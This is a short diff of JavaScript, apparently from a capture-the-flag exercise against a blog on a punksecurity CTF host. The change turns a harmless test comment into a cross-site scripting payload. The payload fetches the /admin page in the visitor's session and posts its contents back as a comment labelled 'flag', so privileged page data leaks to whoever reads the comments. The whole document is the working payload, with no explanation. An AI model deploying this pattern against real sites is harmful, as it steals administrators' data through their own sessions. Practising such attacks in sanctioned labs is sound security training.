@@ -1,9 +1,9 @@
-let formData = new FormData();
-formData.append('name', 'JohnAdmin');
-formData.append('comment', 'John123');
-
-fetch("http://blog.952e4bd6-959.ctf.one.dr.punksecurity.cloud:5000/new-comment",
+fetch("http://blog.ffd86304-57f.ctf.one.dr.punksecurity.cloud:5000/admin",
     {
-        body: formData,
-        method: "post"
-    });
+        method: "get"
+    }).then(response => response.text()).then(data =>  {
+	let formData = new FormData();
+	formData.append('name','flag'); 
+	formData.append('comment',data) 
+	fetch("http://blog.ffd86304-57f.ctf.one.dr.punksecurity.cloud:5000/new-comment",{body: formData, method: "post"});
+	});
